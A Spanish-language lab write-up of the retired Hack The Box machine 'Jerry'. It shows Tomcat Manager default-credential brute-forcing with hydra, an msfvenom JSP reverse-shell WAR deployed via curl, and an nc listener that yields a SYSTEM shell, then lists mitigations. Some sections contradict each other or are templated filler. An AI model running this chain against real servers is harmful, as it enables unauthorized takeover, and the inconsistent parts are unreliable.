---
machine: Jerry
os: Windows
difficulty: Easy
platform: Hack The Box
category: Web / Windows
state: Retired
tags: [windows, tomcat, default-credentials, war, rce]
---

# Jerry — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Sólo hay un puerto: **8080** con Apache Tomcat 7.0.88. El *Manager* está expuesto y usa las credenciales por defecto (`tomcat` / `<password>`). Desde ahí se despliega un WAR con un JSP de shell inversa y, como el servicio corre como **NT AUTHORITY\SYSTEM**, la shell ya es de SYSTEM: no hay escalada.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
8080/tcp open  http  Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
```

Al abrir `http://<IP>:8080/` aparece la página de bienvenida de Tomcat con los enlaces *Server Status*, *Manager App* y *Host Manager*; los dos últimos piden autenticación básica.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Credenciales por defecto** en `/manager/html` (el propio mensaje de error de Tomcat sugiere el formato `tomcat:s3cret` en su documentación de ejemplo). Se puede automatizar:

```bash
hydra -l tomcat -P /usr/share/wordlists/tomcat-defaults.txt <IP> -s 8080 http-get /manager/html
```

2. **Desplegar el WAR**:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
curl -u tomcat:<password> -T shell.war \
  "http://<IP>:8080/manager/text/deploy?path=/shell&update=true"
```

```text
OK - Deployed application at context path [/shell]
```

3. **Disparar la shell** (el JSP se llama igual que el WAR):

```bash
nc -lvnp 4444
curl http://<IP>:8080/shell/
```

```text
Microsoft Windows [Version 6.3.9600]
C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

Las dos flags están en `C:\Users\Administrator\Desktop\flags\`.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`/manager/text` y no `/manager/html`**: el endpoint de texto permite desplegar con `curl` y devuelve el resultado en claro; el HTML necesita navegador y formulario.
- **Nombre del JSP**: cambia en cada build del WAR; se consulta con `jar -tf shell.war` antes de disparar.
- **Firewall**: si `curl` al JSP no llega, comprobar que el WAR quedó en estado `running` en la lista del manager.

- Tomcat Manager con credenciales por defecto es ejecución de código: el panel despliega aplicaciones Java a voluntad.
- Un servicio que corre como SYSTEM convierte el foothold en compromiso total.
- Mitigación: eliminar la aplicación *manager*, credenciales fuertes, y ejecutar el servicio con una cuenta de bajos privilegios.

## Mitigaciones y detección

- Mínimo privilegio en el servicio expuesto y parcheo de la versión vulnerable.
- Detección: revisar los logs del servicio y alertar de peticiones anómalas o picos de error.

## Referencias

- [rop-stack](../../../knowledge/pwn/rop-stack.md)
